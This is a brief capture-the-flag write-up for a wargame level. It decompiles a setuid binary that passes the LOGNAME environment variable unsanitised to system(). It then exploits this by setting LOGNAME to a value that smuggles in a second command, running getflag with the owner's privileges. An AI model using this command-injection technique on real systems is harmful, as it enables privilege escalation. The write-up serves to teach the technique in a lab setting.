There is a program with the setuid bit of flag07:

```bash
-rwsr-sr-x 1 flag07 level07 8805 Mar 5 2016 level07
```

As there is no source code in the home directory, I used Ghidra (dogbolt.org) to obtain a disassembled version of the binary:

```c
int main(int argc, char **argv, char **envp)
{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;

  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18, local_18, local_18);
  setresuid(local_14, local_14, local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  // It retrieves the value of the environment variable LOGNAME
  asprintf(&local_1c, "/bin/echo %s ", pcVar1);
  // It uses it to create a string "/bin/echo $LOGNAME"
  iVar2 = system(local_1c);
  // It executes the string with a syscall
  return iVar2;
}
```

To exploit this, I only need to modify the LOGNAME value:

```bash
export LOGNAME="; getflag > /tmp/flag"
```

The flag is then accessible at /tmp/flag.